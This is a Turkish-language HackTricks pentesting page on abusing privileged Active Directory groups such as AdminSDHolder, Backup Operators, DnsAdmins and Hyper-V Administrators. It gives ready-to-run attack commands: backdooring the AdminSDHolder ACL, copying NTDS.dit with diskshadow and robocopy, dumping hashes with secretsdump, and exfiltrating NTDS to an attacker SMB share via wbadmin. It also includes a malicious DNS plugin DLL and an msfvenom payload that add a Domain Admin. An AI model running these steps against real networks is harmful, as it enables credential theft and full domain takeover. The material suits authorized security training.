# Ayrıcalıklı Gruplar

{{#include ../../banners/hacktricks-training.md}}

## Yönetim ayrıcalıklarına sahip Bilinen Gruplar

- **Yönetici**
- **Alan Yöneticileri**
- **Kuruluş Yöneticileri**

## Hesap Operatörleri

Bu grup, alan üzerindeki yönetici olmayan hesaplar ve gruplar oluşturma yetkisine sahiptir. Ayrıca, Alan Denetleyicisi'ne (DC) yerel giriş yapmayı sağlar.

Bu grubun üyelerini tanımlamak için aşağıdaki komut çalıştırılır:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Yeni kullanıcı eklemek ve DC01'e yerel giriş yapmak izinlidir.

## AdminSDHolder grubu

**AdminSDHolder** grubunun Erişim Kontrol Listesi (ACL), Active Directory içindeki tüm "korunan gruplar" için izinleri belirlediğinden kritik öneme sahiptir; bu gruplar arasında yüksek ayrıcalıklı gruplar da bulunmaktadır. Bu mekanizma, yetkisiz değişiklikleri önleyerek bu grupların güvenliğini sağlar.

Bir saldırgan, **AdminSDHolder** grubunun ACL'sini değiştirerek standart bir kullanıcıya tam izinler verebilir. Bu, o kullanıcıya tüm korunan gruplar üzerinde tam kontrol sağlamış olur. Eğer bu kullanıcının izinleri değiştirilir veya kaldırılırsa, sistemin tasarımı gereği bir saat içinde otomatik olarak geri yüklenir.

Üyeleri gözden geçirmek ve izinleri değiştirmek için kullanılacak komutlar şunlardır:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Bir script, geri yükleme sürecini hızlandırmak için mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Daha fazla bilgi için [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) adresini ziyaret edin.

## AD Geri Dönüşüm Kutusu

Bu gruba üyelik, silinmiş Active Directory nesnelerinin okunmasına izin verir, bu da hassas bilgileri ortaya çıkarabilir:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Domain Controller Erişimi

DC üzerindeki dosyalara erişim, kullanıcı `Server Operators` grubunun bir parçası değilse kısıtlıdır, bu da erişim seviyesini değiştirir.

### Yetki Yükseltme

Sysinternals'tan `PsService` veya `sc` kullanarak, hizmet izinlerini inceleyebilir ve değiştirebilirsiniz. Örneğin, `Server Operators` grubu belirli hizmetler üzerinde tam kontrol sahibidir, bu da keyfi komutların çalıştırılmasına ve yetki yükseltmeye olanak tanır:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Bu komut, `Server Operators` grubunun tam erişime sahip olduğunu ve hizmetlerin yükseltilmiş ayrıcalıklar için manipüle edilmesine olanak tanıdığını gösterir.

## Yedekleme Operatörleri

`Backup Operators` grubuna üyelik, `SeBackup` ve `SeRestore` ayrıcalıkları nedeniyle `DC01` dosya sistemine erişim sağlar. Bu ayrıcalıklar, açık izinler olmaksızın, `FILE_FLAG_BACKUP_SEMANTICS` bayrağını kullanarak klasör geçişi, listeleme ve dosya kopyalama yeteneklerini etkinleştirir. Bu süreç için belirli betiklerin kullanılması gereklidir.

Grup üyelerini listelemek için şunu çalıştırın:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Yerel Saldırı

Bu ayrıcalıkları yerel olarak kullanmak için aşağıdaki adımlar uygulanır:

1. Gerekli kütüphaneleri içe aktarın:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege`'i etkinleştir ve doğrula:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Kısıtlı dizinlerden dosyalara erişim sağlayın ve kopyalayın, örneğin:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Saldırısı

Domain Controller'ın dosya sistemine doğrudan erişim, domain kullanıcıları ve bilgisayarları için tüm NTLM hash'lerini içeren `NTDS.dit` veritabanının çalınmasına olanak tanır.

#### diskshadow.exe Kullanarak

1. `C` sürücüsünün bir gölge kopyasını oluşturun:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. `NTDS.dit` dosyasını yedek kopyadan kopyalayın:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatif olarak, dosya kopyalamak için `robocopy` kullanın:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Hash alımı için `SYSTEM` ve `SAM`'i çıkarın:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` dosyasından tüm hash'leri al:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### wbadmin.exe Kullanımı

1. Saldırgan makinede SMB sunucusu için NTFS dosya sistemini ayarlayın ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
2. Sistem yedeği ve `NTDS.dit` çıkarımı için `wbadmin.exe` kullanın:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pratik bir gösterim için [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) bağlantısına bakın.

## DnsAdmins

**DnsAdmins** grubunun üyeleri, DNS sunucusunda (genellikle Alan Denetleyicileri üzerinde barındırılır) SYSTEM ayrıcalıklarıyla rastgele bir DLL yüklemek için ayrıcalıklarını kullanabilirler. Bu yetenek, önemli bir istismar potansiyeli sağlar.

DnsAdmins grubunun üyelerini listelemek için:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Rastgele DLL Yükle

Üyeler, DNS sunucusunun rastgele bir DLL'yi (yerel veya uzak bir paylaşımdan) yüklemesini sağlamak için aşağıdaki gibi komutlar kullanabilir:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNS hizmetinin yeniden başlatılması (bu ek izinler gerektirebilir) DLL'nin yüklenmesi için gereklidir:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, refer to ired.team.

#### Mimilib.dll

Mimilib.dll'yi belirli komutları veya ters shell'leri çalıştırmak için değiştirmek suretiyle komut yürütme amacıyla kullanmak da mümkündür. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### WPAD Record for MitM

DnsAdmins, global sorgu engelleme listesini devre dışı bıraktıktan sonra bir WPAD kaydı oluşturarak Man-in-the-Middle (MitM) saldırıları gerçekleştirmek için DNS kayıtlarını manipüle edebilir. Responder veya Inveigh gibi araçlar, ağ trafiğini sahteleyip yakalamak için kullanılabilir.

### Event Log Readers
Üyeler, düz metin şifreler veya komut yürütme detayları gibi hassas bilgileri bulma potansiyeline sahip olan olay günlüklerine erişebilirler:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows İzinleri

Bu grup, alan nesnesi üzerindeki DACL'leri değiştirebilir ve potansiyel olarak DCSync ayrıcalıkları verebilir. Bu grubu istismar eden ayrıcalık yükseltme teknikleri Exchange-AD-Privesc GitHub repo'sunda detaylandırılmıştır.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Yöneticileri

Hyper-V Yöneticileri, sanallaştırılmış Etki Alanı Denetleyicileri üzerinde kontrol sağlamak için kullanılabilecek Hyper-V'ye tam erişime sahiptir. Bu, canlı DC'lerin kopyalanmasını ve NTDS.dit dosyasından NTLM hash'lerinin çıkarılmasını içerir.

### Sömürü Örneği

Firefox'un Mozilla Bakım Servisi, Hyper-V Yöneticileri tarafından SYSTEM olarak komutlar çalıştırmak için sömürülebilir. Bu, korumalı bir SYSTEM dosyasına sert bir bağlantı oluşturarak ve bunu kötü niyetli bir çalıştırılabilir dosya ile değiştirmeyi içerir:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Not: Hard link istismarı, son Windows güncellemeleri ile azaltılmıştır.

## Organizasyon Yönetimi

**Microsoft Exchange**'in dağıtıldığı ortamlarda, **Organizasyon Yönetimi** olarak bilinen özel bir grup önemli yetkilere sahiptir. Bu grup, **tüm alan kullanıcılarının posta kutularına erişim** hakkına sahiptir ve **'Microsoft Exchange Güvenlik Grupları'** Organizasyonel Birimi (OU) üzerinde **tam kontrol** sağlar. Bu kontrol, ayrıcalık yükseltmesi için istismar edilebilecek **`Exchange Windows Permissions`** grubunu da içerir.

### Ayrıcalık İstismarı ve Komutlar

#### Yazdırma Operatörleri

**Yazdırma Operatörleri** grubunun üyeleri, **`SeLoadDriverPrivilege`** dahil olmak üzere birkaç ayrıcalıkla donatılmıştır; bu, onlara **bir Alan Denetleyicisine yerel olarak giriş yapma**, onu kapatma ve yazıcıları yönetme yetkisi verir. Bu ayrıcalıkları istismar etmek için, özellikle **`SeLoadDriverPrivilege`** yükseltilmemiş bir bağlamda görünmüyorsa, Kullanıcı Hesabı Kontrolü'nü (UAC) atlamak gereklidir.

Bu grubun üyelerini listelemek için aşağıdaki PowerShell komutu kullanılır:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Daha ayrıntılı istismar teknikleri için **`SeLoadDriverPrivilege`** ile ilgili olarak, belirli güvenlik kaynaklarına başvurulmalıdır.

#### Uzak Masaüstü Kullanıcıları

Bu grubun üyelerine Uzak Masaüstü Protokolü (RDP) aracılığıyla PC'lere erişim izni verilir. Bu üyeleri listelemek için PowerShell komutları mevcuttur:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP'yi istismar etme konusunda daha fazla bilgiye özel pentesting kaynaklarında ulaşılabilir.

#### Uzaktan Yönetim Kullanıcıları

Üyeler **Windows Uzaktan Yönetimi (WinRM)** üzerinden PC'lere erişebilir. Bu üyelerin belirlenmesi şu şekilde gerçekleştirilir:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** ile ilgili istismar teknikleri için belirli belgeler incelenmelidir.

#### Sunucu Operatörleri

Bu grup, Yedekleme ve geri yükleme ayrıcalıkları, sistem saatini değiştirme ve sistemi kapatma dahil olmak üzere Etki Alanı Denetleyicileri üzerinde çeşitli yapılandırmalar gerçekleştirme izinlerine sahiptir. Üyeleri listelemek için verilen komut:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referanslar <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)


{{#include ../../banners/hacktricks-training.md}}
